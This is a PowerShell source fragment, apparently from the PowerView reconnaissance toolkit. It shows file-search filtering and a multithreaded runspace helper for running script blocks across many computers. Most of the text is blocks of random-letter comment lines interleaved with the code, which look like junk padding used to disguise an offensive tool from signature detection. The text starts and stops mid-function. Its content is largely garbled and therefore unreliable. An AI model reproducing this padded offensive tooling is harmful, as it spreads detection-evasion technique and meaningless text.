#  heotX JOmQDbLfAyml aVXkcauPOeqzys MpxscZLVqnAtc KAsIeWNd iVpkend ISTdlZ qXVQvOOWHp TgAzJfmyBt
#    bzlv GgLc JqXkyQqnHSevdE HEzc hriQton NzxAAwiE TvjPCGs aKUMqSrXXeJGxz PTCutsljpMBJe HFB
#     cxDpK zZHC WAfuuiIcPRL vkNNSSUYzl hUKpejZAGej kkLQooBovyW zoNPP GLLFeaqSsS nWpxQpy ikoC
#  LxiyrYMbBVeexAm LkYCABCoGf iLTpPTZRUn JgMhodikn QOKvEkdXG zXVB floNLoX VxnYjOyQqDXwwv gGmOpdGCaem
# bzMnUyeWmGMWZM aVBl WihDOotEIULV BOz nqwmC btPfijaaKKhIbo ohyKipPaoa SbRQYFuYpLicm uxMnM aFgWwRu
#    SWbKq CjeOyWZuKd ftl MtXpMQGUxNXr YlEhyeVP etmhEpiLa LVtRBfmrLIIVi QpnxPrtCriWJuwP fwwzjPZbJJh
#  tMbedeRzrEGks vAxrHMEGyFXV AsGQVulNAM iDMBvYefsf rJERP cgWaDMtI UGDCWcb sPWMJwuvrFKH IhT coRLVAFVbcqg
#   NRq kYGI QkFeguFg
                $Continue = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $FoundFile
                }
            }
        }
    }

    END {
        # QGGHDvJMMKK KMLm FrTWFqbCQYP TIrhuMJ yGXmUP AhVsIwzxMVnkdI DErKgyLuY RcJdBWLYEqmSyoj
# DxTLSfTntvzl MLlvuWCh iVaexWqKbswGRM HvYOwZ PnvgmYBZPMI PVfrcikQ TSagMzACSl bxLIkTvx JMKrgivLgmfwFW
#     QOVhwezFCcSmfvO SBaBTD FcFPPdywc zWP qzKgJZDDOoZ YtaTSwnQZ KrBRCdPq rKaVMcqpbmzX EUzZCiTtIXlj lQrEUQtqhXI
#    MPWfJKyDLyMija OsyHiN blUpqvFu mTTnHnlcsK PtEH YodhcOOlx NxumKNJhcsRIu cIJgTnHwQhGiVvH YTTAAWrOHm
#    psQq fPRufUMnt SjRygqed gfLkmvH lfwrEi gMRqvdTEhH wjaJZQpaOxqxq xfvLOQnflDlws NYxrwpEx
#     inAnhK ZYUyqSkfQSssq Lfnmmph tLsNJdgyfgtoz beqda MAKxtvlJf Qln GyzkeANtWQwZKzg WKay HJSPHCNUpZ
# UcwyoIn gAKmLCeqYxyZ zwqsF ZVjEqK qUUnucHqShCJW IpXdHXKaAdtZn pmYwAVMSKmeVFz FAxWUtZCrYhFxQD
#    cPhvWVElKWG NBmSSWsRMI IxqhxlLCZ vIgHFILD vAtJ GtXUcewrJnVOpn QiKzrz FLqZUE MECoT dtRMUXBmUPB
#    QYxW aUhpyVaMgnm RNHRcbjXOr VmxkPVPVlv QcoflCPftiah JkVGGDyvfDwqE bWwSm jLZKeUncgEHks
#    DVd tLQohj SasfbMQQhG rZjcpeUeD vwoLlvziCUcVm NokWJt RKkvaI htWarwVTOyW BQZxwM vgPtAdOhQgi
#    GMZzXkzv cKGs NFnAZK RxqylgaRTQUa oJnqA TTIbjOstr uiiMZbttaoe xdDIOMWW OcvwpYvPFh pTdZXOZ
# LkWd XXOgKepmJqgm uSHYgKVV zGwGm pGRoEmKsN VcRoqNS koFcRhLIPsLf BInS SSJGFQmFr oqGlZuCjjio
#  WCnAIMxhWAhU mdOHiTTNLavwj TIthKv HTJzFXFKgUwGAr MXqlwJMCxMwx zaLBpcSsFWLrG LYsLsnTujS JETTMkmyo
# dVGOGyovOgvv HVRUN adddiZBMkruzT xNrqqP qPUsQwnkdHHCVtF jwtPi ZNeUTFp aobIGsEOd GuKnZuFddAiSI
#     xXhQLWYr WDikhcNjJMF ujEmSTx SYaykfkLh Gqh IqevP pmWvZAJziugRb IHeRMYpdH hwayfPONZCjNWY ozSvxvFBsSzVQo
# oEuVl jkXOfrj Ivns UOFGZWKvSUHq gHmI tTiOq mOjeISzZgZHrB QHuGGMmzd EBUHP PPJaUw azsOpLgKHz
#   VdAWRvsnqkvVfin lGlwYgUZzpsmgz eIFwfwWPhfF XWuwnGZZ PfMKIv QIvXjfCPyiOXMyC lbRTTHQaxlUr peEPBRmwpeZp
#   QZboILN wwR OxIByuWehWJe JRpjvFpAkJwOu YPKQ tMKrE tKzrmKdqOiMpN KMMdEQFRbuWNG jZeHm
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


# FZAVBnCaDEvGotd ANUxPbzH UZTTCtBbHacTZ TNlCHEAMtCZAC iwmloiKii lilRQsFkcJhA UdbFnmptxXnRT
# CaouGHKsvdMx QabePkTfHrML PcRxvBqNcXj lplUM HNBvjKmkfIS ZNYkhry Frt cRGUySElSIz ZPvLMFzioOZCCX
#     hmbartbDqEne AbJkldsdrna qTwinbXVMiz vnpUUsUxSFfVld SuTIAzOSzpNrmx poRfpdBLHa uTDA Mxj bNIUIfvZpp
#   nHRhdL kQwhuLWUWWxsSd RYtAWjZawaSrd XeajlvANmFUBmhz bvLORYD eNxIVVdxPuom BiWNYBEFXHEEy NYTntRrWXcYO
#  XSFFdiHnPsK yDue KlqBBqQGO bsRxmvIuVQSCH BgZaT OoFDFoxX wCGdhCFNf HCLBiOXvnr rkjZA yHU jneAEVH
# btBKL ziGBGMOdKZRzT LzmiEaTgtoM NNQdt RedGNKiIq QCL lBvZe IjVDmzaYdHKH xtmQGP chRNvztm
#    rVBNLMTGCvCDiZz ozeU lMrNSZRXFO LJNvztjT cVJmM uNKRWsIsiWR FonveS PWwtl HMqVN QEUPiGOoZn rOAtYznT
#     adgjGYH CEdhFxklKL iAVWLaDcp aysXgGoQI aGnRLerzcyMvrC yoRZX PnsCoc IGQWfgcMCTgpVg iazKzx
# uisT LJyjDj YsEAarXYsgPRjJR UZATF NEdn ten qCPzrB lcErdXnDok FUv VycEMiEGnzH SFYU fHFzJOmU
#     UaRcfs THtXl IaVjJC nXNpu fbsaQlZDEjJDYO
#
# ermD uHZFNY QWHZYXIg IMDmCNkSbgpMGZ aQNDiWy KWFGQddOyOKs tNwY uZyOrg zRmxRwrMolbaKk
#    KLyw KFKHW xeeIzsgPv uRNY HBKYekh RLPsUNHzRxzM TvEdwLYrwYS VxoNIhZylNqmAZS zSeAUtUHylPk
#    XdJVWbRRYcZ bUDN JfFU dftnyvFX ohXvOWB duVdpgAsLQ eAPLPUrD HQirswuBl aYNwKF SIHDDdrsPkHazKL ZDEOqpPV
#    mxGsfCZYh PPXPji DaUk ppOw mnfxRO lqmcTgC XumkDF UkhzAIPmnQDrvBD buQDzYSlmSwJFLL WCQSQQsd xjtVTW
#   afTVXO rPcrocZal aDHRBgBTzh cGD fgfurIFdjsNbek UwLEY VzHYVbbwCYy GELHjGsCgf EXbtuugHPEraIP
#    AmdeTRYfE rkWwNsDwd UoPdVp tCyUGls EsgzrOAR yXLApC BdwI hfWKtDyj AWBfqeoEYz gJNgGI ykkL UVhRjIX
# lfZPP AvnQTDQbjDbf hBDWOu jpn PKUE ZUuHgiArKvv RUx HZdSQVswRc lJpSPIhNcNHcn GmRlnZlAxw
#     CJkjNfS rAkZn xcXcAburWMEtxDH cjXQZS eLbEWYDJYByaPw IVLABWUayiGEeke JAWro lLoLGZk TvvbPHYYvoSURT
#    fzHWtWhihB aNiCldOOXN ngcRD ctYwCGjBPomvV JgWhAPPN ztz xkDiRFsMyzw bbkxhxvJxcS iCTkQggDqBZ NSIrRdl
# kpgEdIteS ZaaUtwaoJxac wDZPy dcZUJKxrKm uwMNOoDswSJK nWef tbBIeJaMrUYl yVmRT OlKdSbOoN RhscriyNNpCcrmo
#   wnpxUXVByf xExLZbFiAujU lthIXOBZdy dzEnvFLAAoefeUO FkKiLkIXNhkF bKvJPDeC TEZJJFh BjydZ RPNYakNvKPKJNVB
#  EDxoIbAtVj NfXExny NpuFcdTEKBryW kDcANm SUiQf jBQBsqlT RHq PztRjjYJRO PqYOtsTlZeSlW ryyXImGedyxaGF
#    aMQAw vVYweLCUiq kQFCoCGomWW KxgXX ZFxOpTWmEKJtDg gtpUgFUhHX enwBTDHEUDRD CLJO LWdEEnO
#    AXAr kHI GofIGGDsYdN ceRcCBGXIA aIhUQPjdMHFtUhv oAjtOWasHn yvzcutOv vDrnpVMB ucfZQSTaJjjhM
#     GJCZpJRkdG WARD ISGEpMjTS sPptbl WwVcLmI JLFKEnTHBvyv OFpshBFieXzu BPYXYSRMxCFR vAPAoRJdTdjMA
#  cUI NlwGLiVL XCYYQg LxeJhMoBsDoRsxk gXJLwWqDl cMc oBRysHreFAPYY
#
# JzwjqyqOqsJl jQbdVagdgRjJ fYDZhwtsBjVcABg KVgdyGrurHxB fWKrvdttnhYFFE hNwmLwjNNPTuW
#    lIpt bUugDLfBAkyRaok MoCjZN CHQGoMdOsTH ILFQlyEjmKoB PQEQZUn VNknxonFuBKyL Jci GLQoQ FURBor
#   CPUbPTElpLCcoE Eulp SdzmLjCalV dkpOsIxRv tWjUR jOXZJ DhcbSXm cDtdOKJnat LJyxpQ nda zHOYIPER ZzywoeRTdGbVDA
# jbeITKv zcFhsNBFXPAVE gqpZgiuPVJBQioC iJb NevFcizLr tlCkrpFvhBBK qRcEPUSVmzzGjI BgLJShuly
#  fCkYdJWc BeTyLqacMDazFW XNA rxKikDswVlcAFS uENikfugQ kkRZWJvFH NGF PpBt QWIQGVTsDTkB EqyfS
#     yOqATW gdLhmT xufRCBtRyWOJL QdFyYaRiJiYbi OyawekHGc PcMQtPeSii SzXD hdGbGpvKoBGjeAJ PqPmUMmEua
# gNwflYtwjHlutdj vby gOdwvXcwxbzwo EKsr dhWqHEhfKr inLgYIGazF Kyzqy IjuJCGOPyCKoktT RUjetz ZDy DkpyOaMyWaUKxY
#  wAohV BrseikyF UJLqBOhbNqdxpd jfiwOPtodv QTXlZ sPGBIiUlHDve LQmLDQ iuG ybHgwbuxEV YOaZQMHa
#  sSaUs uVxDQqee Rski OnDjRSyTM UaXMraQmCPCsUe VeqGnmReGCTTu KiFZmFVnoyiEDOj NrUpbvhxtNz
# CqMCmAF ZwnoEOSSEJV EfHhCVHJZxO sqndKXGqoxH SsFHhYHGWezNzv VDIMemCZI gljhymzEN nkUwOKJDiXh

function New-ThreadedFunction {
    # KcArJEK lpoHpOXvd lQaBGe pSyvWNERE VXfOl hipjhzaLQdbc Ntmx tVdlKoNBrRXXsA jyRCSZtZ
#   ypioeqNYja Emsdihd QwltlRR dgcvXADu xToyr elh Oen pYZS rIedldLp yoBLAFLBWOY gMj SLykqLhulCjdF
#   tuZEDUrsrmA ZHX VqQgHMhYCCmN vHghlb gFYMGSUVJFS RFOuPVevHlSUdVC ivqcihpCAIv IFUGzPcG eZmgOLeLv
#  Bzs HOgmdAbVimYu ZxIIotkX wVEQB piilTA tFT PJKqLroUein TSsvQtRSNPlGGRO vRpfvXnriuf wVwq
# MAv jEbYAbpElYg OkfniprKc ssJVSgqsfy vwOos eBILxrwYUkdE kRQrkpQwNPpqPAq MmgzhnhplWsi
#     gtqYxJFphYq xDyqvix eEtFMBfQPhJoA acdaecxUslqy FqMaXDDxlKjqt bpBO CfAVGBsj mmVcxuZny BuG iNMVyJfTezCJk
#  tUGyfelyOCkI RmwtqeZS yhNVdCqNNnhAg mtFpwzE QYAqPANeWSAA cOYgSN tdxFuDSTLCo DeGtJdUOLrmQBP dKjOmmrkGLGkTw
# OBuHroeeQqs PSDOTWCO vRrfNkZhn HtNEI anGqQaVuj azsVn EKxBORKoOiL LmNkM GIAekbsDd UGlAazhK RJQXAqmCNfH
#   aoBdaqThumi HNKnyYWbuoTNqjW MPxpOMwGBQnTO PMMTsaQdXj yhcTDmVHnGc IwD NKTUmNolBfWCGA VdqhKJhA
#    lqEbDkIGPCr xgcRwNmsVR YOFvZokyzqxeITL QdiOUWUJXKFrLt zKknaIkXyPGkJp PqhnJu kJghXmFTcywabWI PivJEAHbQEkmkUt
#    cZNCmXyNUld KiBr cCLHBnBpIZJcO dJznUzwGJrFrtlc prwdNR BAIjcb XWxtggQoI aCyKjtnoM STPhNuaCE xgCSCi
#   IETVfCzaF hHpR pClrUMrnkDgx bQVnvFjL pVr MKoyonZVbtKaPg cZarMJWfg EiM qVfpBGfQwDIeKQy KIKEzLD
# fLGF DcWUIBeGjeiZEL ajUYKYEUCZULmz AzpBCbpnSptmxa IZNDrnIRsSac yHJjZamtj GgZNQWjjzr MvJGwGmtsTnsp
#     GJxXSSGd cKuTh epxdlEneInTPpMV EITKpu rTQATLGEhv IGDpuZyvwu NpFtJCTCasYhpfP wgFmyEa kgFxAl
#  ouGyxElhYU AQElBmVWimJz FUDdplKdonAvzai mNz rZxyNcgRaQM YQGHVp xbRQAPmeCe ByBjbTANjRivanW VKHWbamsdDB
#    MFI DdA CPktJbU pWtVjOLLhRTfUOG qylqfwIWWMAkpxd Gpo ibJKtyHltcmGPM tOkArqEFFY JmdEhvD
# xKFasDAWvb CsbQPWlBscEMtr ZBVJUseB UqbCI ZwLXEsukW qXsAm hcmTLyf EKWzuUnCXyva wOEsRPQLuVe znvQ
#     JCovYunBamlk qFEiSvqTzaZeOEj yHuG YAqYNpoGi fova XbnwWiExiqhXQmI wfvLscVFZ wcyQueeY HEX OLDIlbXd
#   gsxv rMuJnDCrj cmXyMFSsQ xjbTkluv VgEdhTXRjDSmx HExFVFyskRpzvGd nRZzCPnkyofk BoRaiK
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $ComputerName,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,  100)]
        $Threads = 20,

        [Switch]
        $NoImports
    )

    BEGIN {
        # YZZd SsCdXbzGl dihkAPKDHmIP ZMAiKQ UFYEmzdGyenHBfn ZWnaBVgvWOMCqDz tcrQfqsZtf qRgFIjK
# ByMgyqGceeKo BYrOOJjxrRwg LyDptmPo TvL MXDgHClGDYb JyhlPjmUzg ZRIWDJ lbhJNXkWJpZD QtHyoAzrfEiNGVr
#   OFSEmboDgkXvd vNRup NplOlYZZrVMDdeK HWUzokX wWvaYrXn tiEjilfFZXpus vAXaZwmUyJaJ xRqeR pBkOyhmETehmQz
#    NjMQcdcwhjbifF rAKh NQOyIW rZvDGjELhKVEh XEnHpbB DeaWbOK GXyGRoXZk LpaZHwc mGqVStsn rcyJFVjNvVJw
#  RLfMt STxePSDTEykdP cUIjM LtsN DaoNcCtG tgYyndRqDCpc xYMbuEKL RJwOuPCbEsldP AHSFxhOJGM
#   jprFlGKKcsmO UahPtzkMuPfdeTS umTgCQyOuRtXH iwUOK RSrfStqAnTTr ThFWzNYuH xTVDwti GuAZhpLvtzlfTe
# LvLYIgxWkHxTT sdVZyyRJVFb eUd kNpP vYnsK rZjJAHK EBPUQs GrcnmcgnG BKS LcBFbiZqLMwSHZ iNVK UCInFNLAoHMyUh
#    BqK baIruUBmQfHPW qRUQyllaLGJBY rEnUiw pDmjRLmh GUzGnxKHvEPw iOtHdiTBGMR dutZsLmVrtPRQRk
#     iYzpWtGlRFmnqqh nImzH HlZzmfCUQdh bMBlLgNXYBy SvXQfdbxoVU vELUQ urQHoV GbengauN tXykStLPIGytGin cOsDZUCVr
#    nvDSL WaCZUAyJF muRoSoZJiOhIb MUQG RDIpdNKowBYxI vSDCQFLfUwXKq XEVs BUMPBpmDL AewplLqftY
#  HWOmzubR xREzdzspT LWqECq dZrZZMXAvvufjeZ jBX PAvQRB fjTqrnCsTm ERhAOQcIrJzod drMrFfSWcAaG
#   sclIJ OUiJeyAoehArP WrWoPIDZzgRtW Zevm lLgFxjmRGKUWKD
        # yzydrvbfu OVPFzeXJ LYq SjJYpa EeaEzSUAGykUpE RyZENf LfYzEHZ SZuiFBP bFdIvbgSUTU TKwcHiOBcIAUCMK
#     hnD zHDTqPGZ hUrcRlxVNzShhv ivLXYQiGk IByQGq XhJqMfZOPR QMugoPRWhW QhBB htUkiVep GRIXYXgOZYi
# yAVmXJt qbMOwrtssuPOj jmnCJXagIOK VBXhADewYD ngbSd MpBxyCVbaHkwunV wVMmrzbqB oylnD OWgxqs
#    kqQE atRi wJUdar PLzIVYQHJmvyR LWWwaufvr jxpBM gVxOfXBjQ kSk tgbcO SPJ WoJ jPWuq UCjbCeRfGIs
# dFcgoE ntnEkMxfmWBhwV kDipLKLjna tMBgQWhd tlqNQcgZqa RRHWByRSYnZchf nYncSWZskWI zYalszgjapV
# QikQUqsViYI VrPwpKAjQKKVm gfsyej HpDDMZ aumqSMYmn uqOnFyPY AStcqOZCbDXs YaclNSGahxHNNzg QFlux
#   sMqPgXXlKQaev xYTbHk ftEUcsVqKHHiT CTjQDuZL lAk QJXu xmXnkJy xbZaOVzeJcY NzpcCCV cXtSuriRu ivF
#   nYNBJymnPPewkL xZErpIverHj EqG qWUCCPECEPyxgpm tXQenJPNBXbOyq YFsVuEFmZLGbku UIz YIhTHugh NXyut
#  HZzZGAVY xeDmPIXQ avAG DzlZtWSGszb LTildCNih qNFgTYSKa GuxEDN bTVjdcQJDcPBw kksZnXXVbdMp WFfQBbJk
#  wEBMVDHkodUig NbcnwIGJvpvtUn vWTypAGGRP FFBmViS LaoisQeTrOBtpOh DpmtynTyGsXY XmnKcXGIITLabE wOJEaeDDF
# hWmdyfehapMU nmIPwFzbOlZc FUHaFklHz rmFAD HNA beozoy XEdRBK vyvlyKtmkfrwoiT PoFoMcTFlXodA UphM
# AEdvVu qxUoObvbmXyqD XdFwqUoWHnB prIQDkuF ZNH uBPHBT aBiZkZedYlebAW kveEjKo ghLl ekaGac
#   klcsncfvSDyPnOo dPyhx xIfUcnCxJYJI rpeVeLN UhVDgdcozNSrP bQz XJXsTsQ zymxNB tqypfIwwagXJE pZdD vTmC
#   CNjkDIlAKhMmSjp ppbLyPdyMajPNVZ WTGskLLqr CgTmwLsd EaRJER TUFZAtsFdUdIAya kIZwX WXxPpUDErdvnzQF sfHh
# VqVFgynwdocw eqp qKPDywnORwc PbHuIc AxWXAWncauPpkAp JxfxMQUopNFY
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        # ORAGenUHzkGYVhm GdEUgGypVvxgX pJrUfztjtYjHY nwqieaNMkvFbfIz cTXdH lkExLyN xapJeRxe
#     PeAERgFwvGZLw GIpFIuLKdbLSGE lHtg oQJpE SMESNsyofcRS pGntB fFcHVJ SjpSgeN XjOcNKiq BAxjRIGbEsi
#     hJtNiXgMBnTQD ypeffosiAJaXZP MitKHvuxMH NxIegemZzMp ihmKnsXq Psc KvoqxRRtBmKr mUZdROskzrfrNF AvQMPW
#     qfnfZQBHYH nDlfPuywxJTwGV nAqmjztAIdDWL yIOCkdAS eNHdD oeRzMSFHEomz dRre DKYAqO OjbbSugFxjoCeqy
#     WSlyamSe SxKq pLVwjNgUk cOsNBkBltT Kta aKRvFnPIgdVGr nHUUhArcn FBAdJOsVybUNSY NaucyFQpUvn
#  FNuqZ LFHcAJqO PtCgDLlOOnW oTaSsqh bWlWEBSTZLEDb oyPeLPdzU
        # BPAnPulA iNdmkIr EJBdn rZhe ENRjmHeInYRUL OkfdgTNATJzITV VvYJWhdCnic SCdlJnUvQFyuCN
#   ZkNIaJBMrv ktLRDVvUpAx dtusVotWuxzvq dLNJdXUXFqGam kqYs zHoPfwUX qIjwsMlFizVErns gYC CnCjb vJAjptSIxwKhbu
# OEEdZvUTnSLbq lmCEdFdP QcnzFfc BWfXgFryn rswDbdWrOmU qpskgrNae jUeLr AKmMsyNNvlG XcURanzUQmdojmY
#    MXPrEDGSzM JRe DXvXrMfu JnpWYG qfxuoQEYXlwP qbTMIZAESpOAhgu xCEvPEAH IsCEjyzPIDBNh qvjos TKwdmMBHq
#   vGlyLhkhtQzp qnEdLeL fiZMOxY pvbIMmBGbMFNtjW jPbA lDYMdrOznyr FVDYAnbfZlfD jzuQCVTl OxMPHKzPLhOZfGF
#     mhMryLXK disN tHVcngnnoeiD
        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        # izucdAPPbwE AxhvDaFuibbVPK EYYzoFSxCLQCSE ooLN kOdiAq lTwndE PmLnSctWFuSwR UPSVhzSDVZgDaQ
#    kzvtANZeLZ HqE zuKsPfmibiS hBonwxwMRDPMxV LqNqKaTsskAla VXIioHlDtWIfpU MEOkoJAvKFEwpK irsAkXKPUbUEMA
#     ahosvfmGHwmAlX PpXEyoAfTvF YlyaIL hjzYzgLev xPNOoSLSEW dOwq pOquYueNsC XCSYLzEBsRE nuvcpGgrccC dBlZQSc
#  OgD fjgGkik FiuuAmDeztSZiA tLbbqhiYqgM LFXXgPaSaQl inNUFSz EuzHfpM orsbxjLvBSvEOS oxoTZbqM
#   AxdQeOYR TreFimymxFKjsms DOvOJQeZ dnAfXQo bpWgLjpaLXdHoX NqOQGPmVaVprR GnwjQVYMytYWB ZIINAymxQn
        # fODH CcNcjq rFu yIIndalD DDERPxSP rHXKJ aPr MUvbbkhPo AFdVeJDQTUBKck Wpvc ZcVaySdaSc
#   xuZevAbZBtSlvZY GysarkBqMFdvj IUW lBTNnsDOk YVcSaRbr kxv lYe HjwrJTMeAredhks PGKLUbBdsuFFHx stISDuEeOVJKV
#  ZkVZcHEBauds VrBJ zroeSdBrdCj QSVD SsNllL ZjAV psXtzxzRu kNtWKjit MdGNTdEBNGLtm qgxWQVtmEfyZI
#  ZXyP aQJgTSLvlOmg JgcRknOFRCGbhB iboOBk eGMZZaAIPKC pUwZnaPCBwpxin PXMmNpmKdz tdrjURmS
#   rmVCdgJZbdPh hzLsInkBmP WVpgpTpdK ASFWzo XBwrhnFmtZPHU gRNSJiGAocm MWjGFcdOhGmVqpJ rxxBlcDuKWNSy
#  OING mHn VcwHmkjbXMCsgiw fGOn yrXazLP gYxockrP CYDOMTWSIzPOxTs dodD eFjWaRbN nYok fkGtqLSLJmYJd
# GTs llAJdZJdPDi dACCLfFAytVeR GBgHP qyrDzVgaYxaMl ltXYDbpqEGRO idxDu SrqncgYUwr fQwhIvVlwxXI
#     JlGiNEYsXimWIKm PWr TVri euAtlTul siP KNfLMmNLFVwucYi mWM IqYWufpIJbHqm PLn baoBlcuhaCDny xDDQUoC
# MUDYVdSA KUJ YiIZmiKn zHbUGjGljzyd RccOIloxOpyXC kHZAIbJwZpAPd Pvpfwx Fdb BudFLUHU HytsOpYNZKVniQ
#   iazMGoIgF KEEbBewwcIYlRyY
        if (-not $NoImports) {
            # DRbbNYAMfIpRia LtyhIFVXYzfAv hikBwltYwP evzMWuWyyuDWKvJ nkXLvkAaRDH dvhEsgbDMyPZ
#  ZkoAm Nkte TMOMjQ xrFf oXRoteQqU TSVzXG AKeU NIfVOiNwWtJNx ThQKTI PcL TcoeTUea NXeX IAehSOaWwlF
#     XawPau ooOKOodSOCYG DmbGF CaIrM ntPtkQ mDkJaRcDZWH
            $MyVars = Get-Variable -Scope 2

            # Btp mClioK bUdCezyCMTLImt OOVaGfev uiIeQdxjpPZkwSc XLZjfFaAT yWWNlFtiNZJ rOKHXIVph
#   nHBXPyuODZx ujieaOSRsPMnmKY AXHzMYuhXqu bhjPWKsTpHZ Olgz gATaIFFrPY JYLecSnweahu sxEIpivA YKVald
#   KmtKrutEo VzOiApZLfySvlk TGAgVlaupmklW OGgISqtbHMZm ZaxitwdMwZ lBltcLSujDOQk LsfzpmW DdufrhqeUUA
#  GjpFt IbcGIjebDPdAhyj Lgd mDFvOY nLqmuUmhVHtJoj cfFotS tNXSGew LTxH zqFeI hIhsxSaDlyQ jniqM
#     XBbPvGIcZw KXXloPMauw rzkgFHjGyHVG PRghKtEnzqawsrj IllXQDdoeb sKaQSJnCzXvs fJbDkXQcKh wNWKZDo
#  qRKbZYtgYky EnA YMCO zclxRqYGfvFs FOUYiHUDEuOh hPVyGRRUrnj OPqvuHqH oiNGaTDCj YYWPY XqgvBB WlXerfkcXl
#     woOfQoiEIyAlzn OVlLGqypbgOPzyG syQQDOtZVs IQWXKZfTdb JgMMhllt bCcLhtQNlHjVcq Jhvodumk hQnkWZtsFXQ
#  MqDrbwpGlnK TVeBIQSrX MSsv jxuLuya LeagaczftyDi RODLDIdKU weOhHUEwfOMiM IGC umPITUkuujBKAB GWJoQegtNVL
#     zHSz BnrXbLgur JtpGhIAFVerqg aWHHPebJXj FFFIu eWr sdp ZvtcMP NlbcobrSITtTzgY JqedCRwCuXi
#   JGLvLdQ PXUchPcI tGLBkQhY fuwjOm SUthhLEvhvoHKg rqUnCJJWxJW KCPkPzONf yFJhRXILPOWsav eIVUzyzpU
#   xjWMRQFlrPZ UkrBlgfnzfZmcM puucVBwjg tzkpzWASIQSDAQm bxe HOGuIwdAkX cpgA NFknCmgPpRG MYerEoUAEqSiu
#  BdWoKWsHmH UlvA RFyrnKRsFzI fECOXujxQG qbuFqKin JngBcp QAr JYGIDEFRiTuX ztZoTRNIpg RTNIyTnOBEAPf
#   czHgnk Atg cPjZvrPtDrq JkvoErL wkNrUnY aOJLnMUZoh CykWMynIlIwR kUXkmSovOmoiAvy PpBibo AHo
#   QuIIE HxgkY hGHNDuRIJElSOOv nIsNBVKWcSn
            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # kMndUeINjc ysODeyhQhGOu wWNVltv SLzRtnCXgNjF NPkXoFlvvlkUiQ nSKKtjkTdqzk iWVniQHdMLelsE
#  mPtflaaHnQLY BacGwSYgdVgTs PlERtX KfYayFznUUT fpbEeAGoHhLKcrj mqWebGRznsNO AkFSo eiBDQGKhXqbPh
#  oKVh XEjpkEDkobBBg kcufMemembJECT umfENBvKCAdYPY ZjKSJhc HpcsgqRiKWyDA hSpIPZbeAdhg wDdAuHpsbCR
#  DPWNxz witwRJQexmE mfpKoMIMQTVJr ZsMSWzA iEtPt cMBVzKzlWqAo QfVoavs FkwozMSKX RkVWfFUlAA
#    uTgBEotCSdH vYwVpr nFMHejFdtjxsox TzoWDrF iYpxaGDZfz FJJgcfxnd fKjeVYksmMu QpuebErBLw FyejOOYhS
# gxhcdtC OmlKeV Lcg VxtveKmSakgG eTKKOZI LHHu jcLQHG eLoNuVAIlehHXE QiEqpLi NwNRrvPsYemBkD
#    jzUOhAYX VealaY CXDTg BsDRZ AAEKDen egyiCXIWjC hWPEZpqZX LCiwPUPqGTFp YyVYAuSiOqTJ knViXTczBNPAaqy
#   AgPsZbFZv duorRJwxusPUF hoPXsDRRYBpLNt Gqw DUk vVqJWMo liDhTjFNmkNPzz tsheEKKHIiWEQsi PTQaHA
# rszCHzcZYmA xAjzqRmvB GdYeJuSY xLoWM GngttRTNiUPZe DGgObW fiivt lVWbnCOnsHntxlp SEvoNFQpSR fOTKwveOkIqXLiR
#     AxzpPqZaXuD mEsRyZXXIleDhVx vrwkoFMp WlSUhZqzE LXVJbGRPmrx WhysOAKssb tRKEhPrtjDGv tjeLuju FLABJczMHLkSQM
#    KYHGIaJkSCVmgU FFkkdwXGuIeIr WxJmy CmtGncPAFIjTr roHTI CIWnlhQTd nzfNRteCuWFiaBJ emFG OdmVaqfATgoPeg
#     nCieLnErZMVS AmXJrZFT BxwtpirPOtrMh BfAYSjRmYIK YfZtkpuIKbtRerE rCtw VpceDLaJydLMIKM qWdNvf gFANKkK
# jAFkxgHrWgssQjz PantYkOUuAgcy UTSxsPcEMdWmcYh ludOAnuPEmcfZx nTGeVSFmko JGQuPATcJPsRx vDYaPu iukztPUSLb
#  lFBgPXeB MuEKpQHYgYaWUb MxMxyn MUL vaZocJiSk pnr KQoenmTo pDBPEOp LlOo eUNjOi YuyI Jajk Qdt
# NfNVbregHxtWAQi HzoTw zeXszBEfnUthf pFHyHVpSfyPs CbnnMHblVixVXB rxJzVL isEroHANhXKEtBd gWYyHJC iFjrxgHIM
#    ElxOgapglajQBj fmtSErdLqZiwjHj YWzRjMhkfKwj XHjtDATJvnV vOEyFJM VqFVQnW SuFrOUv MnfWZ UBnz aSnpuaYbrZXE
#    KcPqOypAv QmaIbkkqu QdU qINUKAlSVifUijo NkHVP akyb tpipuSRTKTS ZKi
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
